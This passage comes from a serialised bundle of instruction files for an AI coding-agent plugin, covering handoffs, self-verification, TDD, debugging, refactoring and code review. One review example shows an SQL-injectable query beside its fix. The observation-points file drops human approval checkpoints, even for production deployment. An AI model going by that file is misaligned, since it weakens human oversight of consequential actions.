working directory (project root or phase directory).\n\n## After Handoff\n\n1. **Agent terminates** - Do not wait\n2. **Human resolves** the issue separately\n3. **Agent resumes** - On restart, agent verifies fix and continues\n4. **Document in SUMMARY.md** - Note handoff as normal flow\n\n## Resume Protocol\n\nWhen restarting after HANDOFF.md:\n\n1. **Verify the fix** - Run the verification command specified\n2. **Continue execution** - Pick up where left off\n3. **Document the resolution** - In SUMMARY.md or next task log\n\n## Integration with Observation Points\n\nHandoff protocol works with observation-points.md:\n\n- Use Self-Verification Points for normal task completion\n- Use Handoff only for blockers that cannot be auto-verified\n- Both follow Uninterrupted Flow principle (no waiting loops)\n\n## Examples in Context\n\n### During Plan Execution\n\n```markdown\n## Task 2: Deploy application\n\n**Action**: Deploy to production environment\n\n**Verify**: `curl https://myapp.com/health` returns 200\n\n**Done**: Application deployed\n\n---\n\n**HANDOFF Required**\n\n**Reason**: AUTH_GATE\n\n**What Happened**:\nVercel CLI requires authentication before deployment\n\n**What You Need to Do**:\nRun: `vercel login`\n\n**Verification**:\nRun: `vercel whoami` should show your account\n\n**Next Step**:\nRestart execution after authentication\n```\n\n### During TDD Cycle\n\n```markdown\n## Test: User can login\n\n**Action**: Write failing test for login functionality\n\n**Verify**: `pytest tests/test_auth.py::test_login` fails as expected\n\n**Done**: Failing test written\n\n---\n\n**HANDOFF Required**\n\n**Reason**: DEPENDENCY\n\n**What Happened**:\npytest not found - need to install test framework\n\n**What You Need to Do**:\nInstall pytest: `pip install pytest`\n\n**Verification**:\nRun: `pytest --version`\n\n**Next Step**:\nRestart execution after installation\n```\n\n## Key Principles\n\n1. **Clear and Specific:** Precise steps for resolution\n2. **Verifiable:** Include how to confirm fix\n3. **No Ambiguity:** Exact commands or actions needed\n4. **Resume Path:** Clear next steps after resolution\n5. **Standard Format:** Consistent across all operations\n6. **Non-Blocking:** Agent exits, doesn't wait\n\n## Benefits\n\n- **Consistency:** Same handoff format everywhere\n- **Clarity:** Human knows exactly what to do\n- **Efficiency:** No back-and-forth clarification\n- **Resume Path:** Clear restart instructions\n- **Documentation:** Handoffs logged in project state\n",
        "plugins/sys-builder/skills/adhering-execution-standard/references/observation-points.md": "# Execution Observation Points\n\n## Core Principle\n\n**Agents execute autonomously, self-verify via CLI, log results in SUMMARY.md, and continue without interruption.**\n\nPlans execute in UNINTERRUPTED FLOW mode. There are no \"Blocking Checkpoints\" where agents wait for human input. Instead, agents:\n1. Execute the task (implement, configure, build)\n2. Run automated verification (CLI commands, tests)\n3. Log the result in SUMMARY.md\n4. Proceed to the next task\n\n## Standard Pattern\n\n### Self-Verification Point (Automated)\n\n**When:** After completing a task, agent verifies success programmatically\n\n**Pattern:**\n```markdown\n### Task 1: Create utility file\n\n**Scope**: Utility functions module\n\n**Action**: Create a utility file that will contain common helper functions for the application. The file should export functions for email validation, date formatting, and input sanitization.\n\n**Verify**: `ls -la src/utils.ts` returns file exists\n**Verify**: `head -5 src/utils.ts` contains function exports\n\n**Done**: utils.ts created with exported functions\n\n---\n\n**Self-Verification Results:**\n File exists: src/utils.ts\n Contains exports: isValidEmail, formatDate, sanitizeInput\n No syntax errors detected\n```\n\n### Evidence Collection Point (Automated)\n\n**When:** Agent collects verification evidence for phase review\n\n**Pattern:**\n```markdown\n### Task 2: Configure Vercel deployment\n\n**Scope**: Deployment configuration\n\n**Action**: Deploy the application to Vercel using the CLI tool. This will make the application accessible via a public URL for testing and production use.\n\n**Verify**: `vercel ls` shows deployment\n**Verify**: `curl {url}` returns 200\n\n**Done**: App deployed successfully\n\n---\n\n**Verification Evidence:**\n```bash\n# Deployment verification\nvercel ls\n Production: https://myapp-abc123.vercel.app [1m ago]\n\n# Health check\ncurl -s https://myapp-abc123.vercel.app/api/health\n{\"status\":\"ok\"} \n```\n```\n\n### Phase Boundary Point (Automated Review)\n\n**When:** End of phase, before SUMMARY.md creation\n\n**Pattern:**\n```markdown\n## Phase Complete: Foundation\n\nAll tasks executed in UNINTERRUPTED FLOW mode.\n\n**Verification Summary:**\n- [x] User model created and validated\n- [x] Login endpoint tested (200 response)\n- [x] Build succeeds without errors\n- [x] Deployed to production\n\n**Evidence Logged:**\nSee: 01-foundation-SUMMARY.md for detailed verification results\n```\n\n## Key Differences: Old vs New\n\n###  OLD: Blocking Checkpoint\n```markdown\n### Task 1: Build dashboard\n\n**Action**: Create responsive dashboard\n\n**Verify**: Build succeeds\n\n**Done**: Dashboard builds successfully\n\n### Checkpoint: Human Verification (Blocking)\n\n**What Built**: Dashboard at /dashboard\n\n**How to Verify**:\n1. Run development server\n2. Visit dashboard route\n3. Test responsive breakpoints\n\n**Resume Signal**: Type \"approved\" to continue\n```\n\n**Problem:** Agent waits for human input  Stop-and-Wait anti-pattern\n\n###  NEW: Self-Verification Point\n```markdown\n### Task 1: Build dashboard\n\n**Scope**: Dashboard module\n\n**Action**: Create a responsive dashboard component that includes a sidebar for navigation, a header section, and a main content area. The dashboard should adapt to different screen sizes and include responsive design patterns.\n\n**Verify**: Build succeeds\n**Verify**: Dashboard component file exists\n**Verify**: No compilation errors\n\n**Done**: Dashboard component created and builds successfully\n\n---\n\n**Self-Verification Results:**\n Build completed: 0 errors, 0 warnings\n Component exists: src/components/Dashboard\n Route configured: /dashboard\n Responsive classes detected\n\n**Evidence Collected:**\n- Build log: dashboard build completed\n- Component created\n- Responsive breakpoints: 4 detected\n\nNext: Continue to Task 2\n```\n\n**Benefit:** Agent verifies automatically  Uninterrupted Flow\n\n## Observation Point Types\n\n### 1. Self-Verification Point\n\n**Purpose:** Agent confirms task completion programmatically\n\n**Structure:**\n```markdown\n**Scope**: [Optional - describe the scope]\n\n**Action**: [Natural language description of what needs to be done]\n\n**Verify**: [CLI command 1]\n**Verify**: [CLI command 2]\n\n**Done**: [Measurable completion criteria]\n\n---\n\n**Self-Verification Results:**\n [Verification 1 passed]\n [Verification 2 passed]\n\nNext: Continue to next task\n```\n\n**When to use:** After every task\n\n### 2. Evidence Collection Point\n\n**Purpose:** Collect detailed evidence for phase review\n\n**Structure:**\n```markdown\n**Action**: [Implementation]\n\n**Verify**: [Automated checks]\n\n**Done**: [Completion criteria]\n\n---\n\n**Verification Evidence:**\n```bash\n# Command 1\n[output]\n\n# Command 2\n[output]\n```\n\n**Metrics:**\n- [Performance metric]\n- [Quality metric]\n\nNext: Continue to next task\n```\n\n**When to use:** Complex tasks or critical milestones\n\n### 3. Phase Boundary Point\n\n**Purpose:** Mark end of phase with comprehensive verification\n\n**Structure:**\n```markdown\n## Phase Complete: [Name]\n\n**Verification Summary:**\n- [x] Task 1: Verified\n- [x] Task 2: Verified\n- [x] Task 3: Verified\n\n**Evidence Logged:**\nSee: [phase]-SUMMARY.md for detailed results\n\n**Next Phase Ready:**\n[Status and prerequisites]\n```\n\n**When to use:** End of each phase\n\n## Execution Protocol\n\nWhen an agent encounters observation points:\n\n1. **Execute** the task as specified\n2. **Run verification commands** to confirm success\n3. **Log verification results** in structured format\n4. **Collect evidence** (CLI output, metrics, file changes)\n5. **Continue to next task** without waiting for human input\n\n**No waiting. No pausing. No checkpoint gates.**\n\n## Benefits of Observation Points\n\n### For Agents\n- **Autonomy:** Execute without interruption\n- **Clarity:** Clear verification criteria\n- **Evidence:** Rich logs for review\n- **Flow:** Continuous execution\n\n### For Humans\n- **Strategic Focus:** Review at phase boundaries, not every task\n- **Evidence-Rich:** Detailed logs in SUMMARY.md\n- **Clear Handoffs:** HANDOFF.md for blockers\n- **Time Efficiency:** No terminal-sitting\n\n### For Projects\n- **Velocity:** Faster completion\n- **Reliability:** Automated verification\n- **Traceability:** Evidence-based progress\n- **Scalability:** Works for any project size\n\n## When to Use HANDOFF.md\n\nObservation Points handle normal execution. Use HANDOFF.md only for:\n\n- **Authentication Gates:** Credentials required\n- **Critical Failures:** Unrecoverable errors\n- **Ambiguous Requirements:** Task unclear\n- **Missing Dependencies:** Installation required\n\n**Pattern:**\n```markdown\n# HANDOFF Required\n\n**Reason**: [AUTH_GATE | CONFLICT | AMBIGUOUS]\n\n**What Happened**: [Description]\n\n**What You Need to Do**: [Specific action]\n\n**Verification**: [How to confirm it's fixed]\n\n**Next Step**: Restart execution after providing [credentials | clarification | dependency]\n```\n\n## Migration Guide\n\n### From Blocking Checkpoints\n\n**Old Pattern:**\n```markdown\n### Checkpoint: Human Verification (Blocking)\n**Resume Signal**: Type \"approved\"\n```\n\n**New Pattern:**\n```markdown\n**Self-Verification Results:**\n Automated checks passed\n Evidence collected\n\nNext: Continue to Task 2\n```\n\n### From Decision Points\n\n**Old Pattern:**\n```markdown\n### Checkpoint: Decision (Blocking)\n**Resume Signal**: Select: option-a or option-b\n```\n\n**New Pattern:**\n```markdown\n**Decision Required**: [Moved to Planning Phase]\n\n**Evidence Collected**: [Current state]\n\n**Next**: HANDOFF.md created for human decision\n```\n\n### From Human Action\n\n**Old Pattern:**\n```markdown\n### Checkpoint: Human Action (Blocking)\n**Resume Signal**: Type \"done\"\n```\n\n**New Pattern:**\n```markdown\n**Action Required**: [Credentials needed]\n\n**HANDOFF.md Created**: See file for instructions\n\n**Status**: Execution paused, waiting for credentials\n```\n\n## Summary\n\nObservation Points replace Blocking Checkpoints with automated verification and evidence collection. Agents execute in UNINTERRUPTED FLOW, verifying their work programmatically and logging evidence for human review at phase boundaries.\n\n**Core Rule:** If you can verify it with CLI, verify it automatically. If you can't, create a HANDOFF.md and exit.\n",
        "plugins/sys-builder/skills/applying-code-standards/SKILL.md": "---\nname: applying-code-standards\ndescription: \"Provides Universal Standard for TDD, Security, and Code Quality. PROACTIVELY Use when writing code, debugging errors, or reviewing PRs. Modes: debug, review, refactor, implement.\"\ncontext: fork\nagent: worker\nallowed-tools: [Read, Write, Edit, Bash, Glob, Grep]\n---\n\n# Applying Code Standards Protocol\n\n\n\n## Workflow Selection\n\n### Mode: Debugging\n**Trigger**: \"Fix this error\", \"Why is this failing?\", \"Debug...\", crashes, test failures\n**Protocol**: Load and apply the Debugging Workflow section from [core-engineering.md](references/core-engineering.md)\n\n### Mode: Code Review\n**Trigger**: \"Review this\", \"Check for bugs\", \"PR review\", assessing code quality\n**Protocol**: Load and apply [review-workflow.md](references/review-workflow.md)\n\n### Mode: Static Analysis\n**Trigger**: \"Static analysis\", \"Security scan\", \"Code quality check\", \"SAST\", \"Analyze code\"\n**Protocol**: Load and apply [static-analysis-workflow.md](references/static-analysis-workflow.md)\n\n### Mode: Implementation (TDD)\n**Trigger**: \"Implement feature\", \"Write code\", \"Build...\"\n**Protocol**: Load and apply [tdd-protocol.md](references/tdd-protocol.md)\n\n### Mode: Refactoring\n**Trigger**: \"Refactor\", \"Clean up\", \"Improve structure\"\n**Protocol**: Load and apply [refactoring-patterns.md](references/refactoring-patterns.md)\n\n## Engineering Standards\nConsult [core-engineering.md](references/core-engineering.md) for Universal Standards including TDD Protocol, Security (OWASP), Testing, and Debugging workflows.\n\n",
        "plugins/sys-builder/skills/applying-code-standards/references/core-engineering.md": "# Core Engineering Standards\n\n## Universal Standards\n\n### Security (OWASP Top 10)\n- **Injection Prevention**: All user inputs validated/sanitized\n- **Authentication**: Auth checks on sensitive endpoints\n- **Access Control**: Authorization on every protected resource\n- **Cryptography**: No hardcoded passwords or keys\n- **Input Validation**: All entry points validated\n- **Error Handling**: Errors don't expose sensitive information\n- **Dependencies**: No vulnerable/outdated components\n\n### Testing Standards\n- No code without tests\n- Edge cases covered\n- Test quality and assertions correct\n\n### State Persistence\n- Persist decisions to `.cattoolkit/context/scratchpad.md`\n\n## Test-Driven Development (TDD)\n\n### Three Laws of TDD\n1. **First Law**: You may not write production code until you have written a failing test.\n2. **Second Law**: You may not write more of a test than is sufficient to fail, and not compiling is failing.\n3. **Third Law**: You may not write more production code than is sufficient to pass the currently failing test.\n\n### Red-Green-Refactor Cycle\n\n#### Red (Fail) - Write failing test first\n- Write a test that describes the desired functionality\n- Run the test to confirm it fails\n- Failures should be compilation errors or assertion failures\n\n#### Green (Pass) - Minimal implementation\n- Write the minimal production code to make the test pass\n- Focus on making the test green, not on code quality\n- Resist the urge to optimize or refactor yet\n\n#### Refactor - Clean up while tests pass\n- Improve the code design while maintaining functionality\n- Remove duplication\n- Improve naming and structure\n- All tests must continue to pass\n\n### Test Structure (AAA Pattern)\n- **Arrange**: Set up test data and conditions\n- **Act**: Execute the code under test\n- **Assert**: Verify the results\n\n### Testing Strategy\n- **Unit Tests (70%)**: Focus on pure functions and business logic\n- **Integration Tests (20%)**: Test interaction between modules\n- **E2E Tests (10%)**: Critical user journeys only\n\n## Debugging Workflow\n\n### Phase 1: Capture Trace\n1. **Gather Error Information**\n   - Full stack trace\n   - Error message and context\n   - Input that caused the error\n   - Expected vs actual behavior\n\n2. **Reproduce the Issue**\n   - Create minimal reproduction case\n   - Document steps to trigger the bug\n   - Verify issue is consistent\n\n### Phase 2: Hypothesize\n1. **Root Cause Analysis**\n   - Identify the failure point\n   - Trace the execution flow backwards\n   - Consider multiple hypotheses\n\n2. **Prioritize Hypotheses**\n   - Most likely cause first\n   - Easiest to test first\n   - Eliminate impossible causes\n\n### Phase 3: Test (Repro)\n1. **Validate Hypothesis**\n   - Run targeted tests\n   - Add logging/breakpoints\n   - Use scientific method\n\n2. **Iterate**\n   - Refine hypothesis based on results\n   - Test next most likely cause\n   - Continue until root cause found\n\n### Phase 4: Fix & Verify\n1. **Implement Fix**\n   - Make minimal change to address root cause\n   - Document the fix and reasoning\n\n2. **Verify Solution**\n   - Test with original reproduction case\n   - Run full test suite\n   - Check for regressions\n   - Add regression test\n\n## Testing Strategy\n\n### Purpose\nCreate a robust test suite following the Testing Pyramid.\n\n### Process\n\n#### Step 1: Unit Tests (70%)\nFocus on pure functions and business logic.\n- Mock all external dependencies (DB, Network).\n- Cover Happy Path + 2 Edge Cases + 1 Error State.\n\n#### Step 2: Integration Tests (20%)\nTest the interaction between modules (e.g., API -> DB).\n- Use real database (test instance).\n- Mock only 3rd party APIs (Stripe, Twilio).\n\n#### Step 3: E2E Tests (10%)\nCritical user journeys only.\n- Login -> Checkout -> Payment.\n\n### Success Criteria\n- [ ] Tests are deterministic (no flake).\n- [ ] Tests run fast (unit tests < 5ms).\n- [ ] Failure messages are descriptive.\n\n## Code Review\n\n### Purpose\nAct as a Senior Engineer reviewing a Junior Engineer's PR. Focus on Logic, Security, and Maintainability.\n\n### Review Checklist\n\n#### 1. Correctness\n- [ ] Does the logic handle edge cases (null, 0, empty array)?\n- [ ] Are error states handled (try/catch, promises)?\n\n#### 2. Security\n- [ ] No hardcoded secrets?\n- [ ] Inputs validated/sanitized?\n- [ ] Auth checks on sensitive endpoints?\n\n#### 3. Performance\n- [ ] No DB queries inside loops?\n- [ ] Large datasets paginated?\n- [ ] Heavy computations cached?\n\n#### 4. Maintainability\n- [ ] Variables named for intent (`userList` vs `data`)?\n- [ ] Functions do one thing?\n- [ ] No magic numbers?\n\n### Process\n\n#### Step 1: Gather Context\n```bash\ngit diff --staged  # or git diff HEAD~1\n```\n\n#### Step 2: The \"Blast Radius\" Check\nBefore reviewing lines, check imports and usages.\n```bash\ngrep -r \"ChangedFunctionName\" .\n```\n\n#### Step 3: Analysis\nReview the changes against the checklist:\n1. **Correctness**: Does it actually solve the problem?\n2. **Security**: Are inputs sanitized? Auth checks present?\n3. **Performance**: Any N+1 queries? Loop inefficiencies?\n4. **Style**: Variable naming, folder structure.\n\n#### Step 4: Report Findings\nGroup findings by severity:\n- **[CRITICAL]**: Must fix immediately (Bug/Security).\n- **[WARNING]**: Strong recommendation (Tech debt).\n- **[NIT]**: Style/Preference.\n\n### Success Criteria\n- [ ] Report is categorized by severity.\n- [ ] Every finding includes a specific file:line reference.\n- [ ] Every critical finding suggests a concrete fix.\n\n## Security Checklist (OWASP Top 10)\n\n### A01:2021 - Broken Access Control\n- [ ] Authentication required for all sensitive endpoints\n- [ ] Authorization checks on every protected resource\n- [ ] No direct object references without validation\n- [ ] Session management properly implemented\n- [ ] Role-based access control (RBAC) enforced\n\n### A02:2021 - Cryptographic Failures\n- [ ] Data encrypted in transit (TLS/SSL)\n- [ ] Data encrypted at rest\n- [ ] Strong encryption algorithms used (AES-256, RSA-2048+)\n- [ ] Cryptographic keys properly secured\n- [ ] No hardcoded passwords or keys\n\n### A03:2021 - Injection\n- [ ] All user inputs parameterized/prepared statements\n- [ ] No dynamic SQL queries\n- [ ] Input validation on all entry points\n- [ ] Output encoding/escaping implemented\n- [ ] Command injection prevention (no eval(), exec())\n\n### A04:2021 - Insecure Design\n- [ ] Threat modeling completed\n- [ ] Security requirements defined\n- [ ] Secure architecture patterns followed\n- [ ] Defense in depth implemented\n- [ ] Security controls fail securely\n\n### A05:2021 - Security Misconfiguration\n- [ ] Default accounts/passwords changed\n- [ ] Unnecessary features disabled\n- [ ] Security headers configured (CSP, HSTS, X-Frame-Options)\n- [ ] Error messages don't expose sensitive info\n- [ ] Security updates applied\n\n### A06:2021 - Vulnerable and Outdated Components\n- [ ] Dependencies regularly updated\n- [ ] Vulnerability scanning implemented\n- [ ] No deprecated libraries in use\n- [ ] Component versions tracked\n- [ ] Security advisories monitored\n\n### A07:2021 - Identification and Authentication Failures\n- [ ] Multi-factor authentication (MFA) where appropriate\n- [ ] Strong password policies enforced\n- [ ] Account lockout after failed attempts\n- [ ] Session timeouts implemented\n- [ ] No session fixation vulnerabilities\n\n### A08:2021 - Software and Data Integrity Failures\n- [ ] Code signed and verified\n- [ ] Integrity checks on updates\n- [ ] No unsigned/unaltered plugins\n- [ ] Secure CI/CD pipeline\n- [ ] Dependencies pinned and verified\n\n### A09:2021 - Security Logging and Monitoring Failures\n- [ ] Security events logged (auth failures, access attempts)\n- [ ] Logs protected from tampering\n- [ ] Monitoring/alerting configured\n- [ ] Log retention policy defined\n- [ ] Regular log review process\n\n### A10:2021 - Server-Side Request Forgery (SSRF)\n- [ ] URL validation on external requests\n- [ ] Network segmentation implemented\n- [ ] Allowlist of approved URLs/domains\n- [ ] Response validation implemented\n- [ ] Metadata protection enabled\n\n### Input Validation\n- [ ] Length limits enforced\n- [ ] Type checking implemented\n- [ ] Range/format validation\n- [ ] Canonicalization performed\n- [ ] Reject unexpected input\n\n### Output Security\n- [ ] HTML encoding for web output\n- [ ] SQL escaping for database\n- [ ] Command escaping for shell\n- [ ] URL encoding for links\n- [ ] JSON/XML encoding\n",
        "plugins/sys-builder/skills/applying-code-standards/references/debug.md": "# Debugging Protocol\n\n## Core Purpose\n\nFix bugs using the Scientific Method (Hypothesis  Test  Fix), not guesswork.\n\n## 6-Phase Debugging Protocol\n\n### Phase 0: Security Check\n**CRITICAL:** Read security checklist below before modifying code.\n\nDebugging often involves temporary fixes, logging sensitive data, or bypassing validation. Ensure you don't inadvertently create security issues.\n\n### Phase 1: Capture & Reproduce\n1. **Capture**: Run the code to see the EXACT error message\n   ```bash\n   npm run test\n   ```\n2. **Context**: Get the environment state\n   ```bash\n   node --version\n   git status\n   ```\n\n### Phase 2: Analyze\nRead the *full* stack trace and the relevant source file:\n- **Trace**: Identify the file:line where it crashes\n- **Code**: Read the surrounding logic\n\n### Phase 3: Hypothesis Generation\nFormulate 2 plausible theories:\n- \"Hypothesis A: The `user` object is null because fetch failed\"\n- \"Hypothesis B: The API key env var is missing\"\n\n### Phase 4: Test Hypothesis\nAdd logs or create a reproduction script to prove one hypothesis TRUE.\n*Do not fix yet. Prove it first.*\n\n### Phase 5: Fix & Verify\n1. Apply the fix\n2. Run the reproduction case again to confirm it passes\n3. Run related tests to ensure no regressions\n\n### Phase 6: Complete\n- Root cause identified (not just symptom patch)\n- All tests pass\n- No regressions introduced\n\n## Security Checklist (OWASP Top 10)\n\n**Before executing any code modifications:**\n\n- [ ] **Injection Prevention**: All user inputs validated/sanitized, no dynamic SQL\n- [ ] **Authentication**: Auth checks on sensitive endpoints, no hardcoded secrets\n- [ ] **Access Control**: Authorization checks on every protected resource\n- [ ] **Cryptography**: No hardcoded passwords or keys\n- [ ] **Input Validation**: All entry points validated\n- [ ] **Error Handling**: Errors don't expose sensitive information\n- [ ] **Dependencies**: No vulnerable/outdated components\n\n## Success Criteria\n- [ ] Bug reproduced deterministically\n- [ ] Root cause identified (not symptom patch)\n- [ ] All tests pass\n- [ ] Security checklist verified\n",
        "plugins/sys-builder/skills/applying-code-standards/references/prototype.md": "# Workflow: Rapid Prototyping\n\n## Purpose\nCreative exploration through throwaway first drafts, followed by mandatory rigor.\n\n## Philosophy\n\nLLMs solve creative problems better through **drafting then editing**. This workflow explicitly separates:\n\n1. **Draft Phase** - Vibe code freely, get something working\n2. **Harden Phase** - Apply engineering rigor to the draft\n\n**This is NOT an excuse for sloppy code.** It's recognition that creative problem-solving benefits from exploration before optimization.\n\n## When to Use\n\n- Complex features with unclear implementation paths\n- Exploring multiple architectural approaches\n- Greenfield code where patterns aren't established\n- Creative problem-solving where the \"right\" answer isn't obvious\n\n## When NOT to Use\n\n- Bug fixes (use debug workflow)\n- Security-sensitive code (use security-audit first)\n- Simple, well-understood features\n- Production hotfixes\n\n## Process\n\n### Phase 1: Draft (Checks Suspended)\n\n**Goal:** Get something working. Explore the problem space.\n\n**Suspended during draft:**\n- Security checklist validation\n- Architecture compliance\n- Code style enforcement\n- Performance optimization\n- Complete error handling\n\n**Still mandatory:**\n- Basic functionality works\n- No obvious data corruption risks\n- No credentials in code\n\n**Process:**\n\n1. **State the goal clearly** - What are we trying to build?\n2. **Code freely** - Focus on making it work, not making it perfect\n3. **Test the happy path** - Verify basic functionality\n4. **Checkpoint** - Working prototype exists\n\n```\n[DRAFT COMPLETE]\nPrototype: {description}\nStatus: Working / Partially working / Concept only\nKnown shortcuts:\n- {shortcut 1}\n- {shortcut 2}\nReady for hardening: Yes/No\n```\n\n### Phase 2: Harden (Full Rigor)\n\n**Goal:** Transform draft into production-quality code.\n\n**Now mandatory:**\n- `references/security-checklist.md` - Full security review\n- `references/refactoring-patterns.md` - Code quality patterns\n\n**Hardening Checklist:**\n\n```markdown\n## Security\n- [ ] Input validation on all entry points\n- [ ] No SQL injection vectors\n- [ ] No XSS vulnerabilities\n- [ ] Authentication/authorization checks\n- [ ] Sensitive data handling\n\n## Error Handling\n- [ ] All error paths handled\n- [ ] Meaningful error messages\n- [ ] No swallowed exceptions\n- [ ] Graceful degradation\n\n## Code Quality\n- [ ] Functions under 20 lines\n- [ ] Clear naming\n- [ ] No magic numbers/strings\n- [ ] DRY - no duplicated logic\n\n## Performance\n- [ ] No N+1 queries\n- [ ] Appropriate caching\n- [ ] No blocking operations in hot paths\n\n## Testing\n- [ ] Happy path tested\n- [ ] Edge cases covered\n- [ ] Error paths tested\n```\n\n**Process:**\n\n1. **Read security checklist** - `references/security-checklist.md`\n2. **Review draft against checklist** - Identify all gaps\n3. **Fix systematically** - One category at a time\n4. **Run full test suite** - Verify nothing broke\n5. **Final review** - Would you deploy this?\n\n### Phase 3: Commit\n\nOnly after hardening is complete:\n\n```bash\ngit add -A\ngit commit -m \"feat: {feature description}\n\nDraft-then-harden approach:\n- Initial prototype explored {approach}\n- Hardened with full security review\n- {key decisions made}\"\n```\n\n## Anti-Patterns\n\n **Skipping Phase 2** - Draft code shipping to production\n **Over-drafting** - Spending too long in draft phase\n **Draft in security-critical code** - Authentication, payments, data access\n **Using as excuse** - \"It's just a prototype\" for code that will ship\n\n## Success Criteria\n\n- [ ] Phase 1: Working prototype exists\n- [ ] Phase 2: All hardening checklist items addressed\n- [ ] Phase 3: Code passes full test suite\n- [ ] Final: You would confidently deploy this\n",
        "plugins/sys-builder/skills/applying-code-standards/references/refactor.md": "# Workflow: Safe Refactoring\n\n## Purpose\nImprove code structure without altering external behavior.\n\n## Required Reading\n- `references/security-checklist.md` - **MANDATORY** for all refactoring operations\n- `references/refactoring-patterns.md` - Code improvement patterns\n\n## Process\n\n### Step 1: Establish Safety Net\nRun tests **before** touching anything.\n```bash\nnpm test\n```\n*If tests fail, stop. Fix tests first.*\n\n### Step 2: Identify Smells\n- **Long Method**: >20 lines?\n- **Cognitive Complexity**: Too many `if/else`?\n- **Duplication**: Copy-pasted logic?\n\n### Step 3: Apply Pattern\nChoose one transformation:\n- Extract Method\n- Rename Variable\n- Inline Temp\n- Extract Class\n\n### Step 4: Verify\nRun tests again.\n```bash\nnpm test\n```\n\n## Success Criteria\n- [ ] Tests pass before AND after.\n- [ ] Code is demonstrably cleaner (lower complexity score/LOC).\n- [ ] No behavioral changes occurred.",
        "plugins/sys-builder/skills/applying-code-standards/references/refactoring-patterns.md": "# Refactoring Patterns\n\n## When to Refactor\n- Code smells present (duplication, long methods, large classes)\n- Before adding new features\n- After tests are passing\n- When fixing bugs\n\n## Common Refactoring Techniques\n\n### Composing Methods\n- **Extract Method**: Break down complex methods\n- **Inline Method**: Replace method calls with method body\n- **Replace Temp with Query**: Use method instead of temporary variable\n- **Introduce Parameter Object**: Group related parameters\n\n### Moving Features Between Objects\n- **Move Method**: Move method to more appropriate class\n- **Move Field**: Move field to more appropriate class\n- **Extract Class**: Split class with multiple responsibilities\n- **Inline Class**: Merge class with single responsibility\n\n### Organizing Data\n- **Replace Data Value with Object**: Wrap primitives in objects\n- **Change Value to Reference**: Use objects for identity-based data\n- **Replace Array with Object**: Use objects instead of arrays\n- **Encapsulate Collection**: Return copies, not direct references\n\n### Simplifying Conditional Expressions\n- **Decompose Conditional**: Extract methods from complex conditions\n- **Consolidate Conditional Expression**: Merge similar conditions\n- **Replace Conditional with Polymorphism**: Use polymorphism for type-based logic\n\n## Code Smells\n- **Feature Envy**: A method accesses data of another object more than its own. -> *Move Method*\n- **Long Parameter List**: >3 arguments. -> *Introduce Parameter Object*\n- **Shotgun Surgery**: Making many small changes to many classes for one feature. -> *Move Field/Method*\n\n## SOLID Principles\n- **S**ingle Responsibility\n- **O**pen/Closed\n- **L**iskov Substitution\n- **I**nterface Segregation\n- **D**ependency Inversion\n\n## Refactoring Safety\n1. **Always have tests** before refactoring\n2. **Make changes small and incremental**\n3. **Run tests frequently**\n4. **Don't change behavior** while refactoring\n5. **Leave code better than you found it**\n",
        "plugins/sys-builder/skills/applying-code-standards/references/review-workflow.md": "# Code Review Protocol\n\n## Core Purpose\n\nAct as a Senior Engineer reviewing a Junior Engineer's PR. Focus on Logic, Security, and Maintainability.\n\n## Review Checklist\n\n### 1. Correctness\n- [ ] Does the logic handle edge cases (null, 0, empty array)?\n- [ ] Are error states handled (try/catch, promises)?\n- [ ] Does the change actually solve the stated problem?\n- [ ] Are there unintended side effects?\n\n### 2. Security (OWASP Top 10)\n- [ ] **Injection Prevention**: All user inputs validated/sanitized, no dynamic SQL\n- [ ] **Authentication**: Auth checks on sensitive endpoints, no hardcoded secrets\n- [ ] **Access Control**: Authorization checks on every protected resource\n- [ ] **Cryptography**: No hardcoded passwords or keys\n- [ ] **Input Validation**: All entry points validated\n- [ ] **Error Handling**: Errors don't expose sensitive information\n- [ ] **Dependencies**: No vulnerable/outdated components\n\n### 3. Performance\n- [ ] No DB queries inside loops?\n- [ ] Large datasets paginated?\n- [ ] Heavy computations cached?\n- [ ] No unnecessary re-renders (frontend)?\n- [ ] Efficient algorithms used (appropriate time complexity)?\n\n### 4. Maintainability\n- [ ] Variables named for intent (`userList` vs `data`)?\n- [ ] Functions do one thing?\n- [ ] No magic numbers?\n- [ ] Code follows DRY principle?\n- [ ] Appropriate abstractions?\n\n### 5. Testing\n- [ ] Test coverage for new functionality?\n- [ ] Edge cases tested?\n- [ ] Test quality and assertions correct?\n- [ ] Tests are deterministic (no flakes)?\n\n### 6. Documentation\n- [ ] Complex logic commented?\n- [ ] Function signatures documented?\n- [ ] README updated if needed?\n- [ ] CHANGELOG entry for user-facing changes?\n\n### 7. Static Analysis (NEW)\n- [ ] Linter passes without new warnings?\n- [ ] Type checking passes (TypeScript, mypy, etc.)?\n- [ ] Security scan clean (no new vulnerabilities)?\n- [ ] Dependency audit passed?\n\n## Review Process\n\n### Step 1: Gather Context\n```bash\ngit diff --staged  # or git diff HEAD~1\n```\n\n### Step 2: The \"Blast Radius\" Check\nBefore reviewing lines, check imports and usages:\n```bash\ngrep -r \"ChangedFunctionName\" .\n```\n\n### Step 3: Run Automated Checks\n```bash\n# Run linter\nnpm run lint  # or ruff check ., golangci-lint run, etc.\n\n# Run type checker\nnpm run type-check  # or tsc --noEmit, mypy .\n\n# Run security scan\nnpm audit  # or pip-audit, go list -json, cargo audit\n```\n\n### Step 4: Analysis\nReview the changes against the checklist:\n\n1. **Correctness**: Does it actually solve the problem?\n2. **Security**: Are inputs sanitized? Auth checks present?\n3. **Performance**: Any N+1 queries? Loop inefficiencies?\n4. **Style**: Variable naming, folder structure\n5. **Testing**: Adequate test coverage?\n6. **Static Analysis**: Any tool warnings or errors?\n\n### Step 5: Report Findings\nGroup findings by severity and provide specific file:line references:\n\n- **[CRITICAL]**: Must fix immediately (Bug/Security)\n- **[WARNING]**: Strong recommendation (Tech debt)\n- **[NIT]**: Style/Preference\n\n## Output Format\n\nEach finding must include:\n- File:line reference\n- Category (security/performance/correctness/style/analysis)\n- Description of the issue\n- Concrete fix suggestion (for CRITICAL/WARNING)\n\n## Example Review Output\n\n```markdown\n## Review Summary\n**Files Changed**: 5\n**Lines Added**: 127\n**Lines Removed**: 43\n\n## Critical Issues\n\n### [CRITICAL] SQL Injection Risk\n- **File**: `src/api/users.ts:45`\n- **Category**: security\n- **Description**: User input is directly interpolated into SQL query\n- **Fix**: Use parameterized query:\n```typescript\n// Before\nconst query = `SELECT * FROM users WHERE id = ${userId}`;\n\n// After\nconst query = 'SELECT * FROM users WHERE id = $1';\nawait db.query(query, [userId]);\n```\n\n### [CRITICAL] Missing Authorization Check\n- **File**: `src/api/admin/delete.ts:12`\n- **Category**: security\n- **Description**: Admin endpoint lacks role verification\n- 